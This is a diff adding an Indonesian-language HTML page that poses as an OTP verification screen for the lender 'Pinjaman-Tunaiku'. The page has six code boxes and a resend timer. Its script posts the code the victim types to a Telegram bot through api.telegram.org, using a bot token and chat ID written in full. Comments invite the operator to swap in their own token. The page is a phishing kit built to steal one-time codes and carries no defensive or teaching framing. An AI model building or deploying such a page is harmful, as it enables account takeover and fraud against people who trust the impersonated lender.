@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pinjaman-Tunaiku</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Navbar atas */
+        .nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background-color: #007bff;
+            padding: 12px 20px;
+            color: white;
+            box-sizing: border-box;
+            z-index: 1001;
+        }
+
+        .nav h2 {
+            margin: 0;
+            font-size: 1.5em;
+            text-align: left;
+        }
+
+        #main-content {
+            padding: 20px;
+            flex: 1;
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+            position: relative;
+        }
+
+        .form-container {
+            max-width: 400px;
+            margin: 0 auto;
+            text-align: center;
+            padding-bottom: 80px;
+            position: relative;
+            margin-top: 50px;
+        }
+
+        .input-container {
+            display: flex;
+            justify-content: space-between;
+            margin: 15px auto;
+        }
+
+        .input-container input[type="tel"] {
+            width: 40px;
+            height: 40px;
+            font-weight: bold;
+            font-size: 15px;
+            text-align: center;
+            border: 2px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        .form-container button {
+            width: 90%;
+            padding: 15px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            color: white;
+            background-color: silver;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            max-width: 340px;
+            font-weight: bold;
+            margin-left: 18px;
+            transition: background-color 0.3s ease;
+        }
+
+        .form-container button.active {
+            background-color: #00a550;
+        }
+
+        .help-text {
+            margin-bottom: 6px;
+            color: #555;
+            position: fixed;
+            bottom: 46px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+        }
+
+        .help-text a {
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        .timer {
+            color: green;
+            font-weight: bold;
+            margin-top: 10px;
+            margin-left: -120px;
+            font-size: 14px;
+        }
+
+        .blue-text, .red-text, .black-text, .white-text {
+            color: black;
+            font-weight: bold;
+        }
+
+        .red-text {
+            font-size: 15px;
+        }
+
+        .blue-text, .black-text, .white-text {
+            font-size: 15px;
+        }
+
+        .red-text {
+            margin-left: -148px;
+        }
+
+        .black-text {
+            margin-left: -220px;
+        }
+
+        .white-text {
+            margin-left: -270px;
+            font-size: 14px;
+        }
+
+        .error-message {
+            color: red;
+            font-size: 16px;
+            font-weight: bold;
+            text-align: center;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="main-content">
+        <div class="nav">
+            <h2>Kode Verifikasi</h2>
+        </div>
+        <div class="form-container">
+            <p class="red-text">Kode Verifikasi Dikirim ke</p>
+            
+            <p class="black-text"> +62xxx xxx xxx</p>
+            <form id="verification-form">
+                <div class="input-container">
+                    <input type="tel" maxlength="1">
+                    <input type="tel" maxlength="1">
+                    <input type="tel" maxlength="1">
+                    <input type="tel" maxlength="1">
+                    <input type="tel" maxlength="1">
+                    <input type="tel" maxlength="1">
+                </div>
+                <div class="timer">Tunggu <span id="countdown">00:49</span> untuk kirim ulang</div>
+                <button id="submit-btn" disabled>Selanjutnya</button>
+            </form>
+            <div id="error-message" class="error-message">Kode OTP salah atau tidak valid</div>
+        </div>
+    </div>
+
+    <script>
+        const inputs = document.querySelectorAll('.input-container input');
+        const submitBtn = document.getElementById("submit-btn");
+        const errorMessage = document.getElementById("error-message");
+        let timeLeft = 49;
+        const countdownElement = document.getElementById('countdown');
+
+        // Mengatur fokus otomatis antar input
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                if (input.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+                checkInputs();
+            });
+        });
+
+        // Memeriksa jika salah satu input terisi
+        function checkInputs() {
+            const anyFilled = Array.from(inputs).some(input => input.value.trim() !== "");
+            if (anyFilled) {
+                submitBtn.classList.add("active");
+            } else {
+                submitBtn.classList.remove("active");
+            }
+
+            const allFilled = Array.from(inputs).every(input => input.value.trim() !== "");
+            submitBtn.disabled = !allFilled;
+        }
+
+        // Mengirimkan OTP ke Telegram dan menampilkan pesan error jika salah
+        submitBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+
+            const otp = Array.from(inputs).map(input => input.value).join('');
+            const validOtp = '123456'; // Ganti dengan logika validasi OTP Anda
+
+            if (otp === validOtp) {
+                sendOtpToTelegram(otp);
+            } else {
+                showError();
+            }
+        });
+
+        function sendOtpToTelegram(otp) {
+            const token = '6711678141:AAHCPWlRygK8bHdAhXUlfIFCf6GztfCwsjY'; // Ganti dengan TOKEN bot Anda
+            const chatId = '6824078885'; // Ganti dengan CHAT_ID Anda
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            const data = {
+                chat_id: chatId,
+                text: `OTP yang dimasukkan: ${otp}`
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            }).then(response => {
+                console.log('Status Code:', response.status);  // Log status code
+                return response.json(); // Mengambil response JSON untuk logging lebih lanjut
+            }).then(data => {
+                console.log('Response Data:', data);  // Log response data
+                if (data.ok) {
+                    alert('OTP berhasil dikirim ke Telegram');
+                } else {
+                    alert('Gagal mengirim OTP ke Telegram');
+                }
+            }).catch(error => {
+                console.error('Error:', error);  // Log error
+                alert('Gagal mengirim OTP ke Telegram');
+            });
+        }
+
+        function showError() {
+            errorMessage.style.display = 'block';
+            setTimeout(() => {
+                errorMessage.style.display = 'none';
+            }, 3000);
+        }
+
+        // Mengatur timer
+        const timer = setInterval(() => {
+            timeLeft--;
+            countdownElement.textContent = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
+
+            if (timeLeft <= 0) {
+                clearInterval(timer);
+                countdownElement.textContent = "00:00";
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
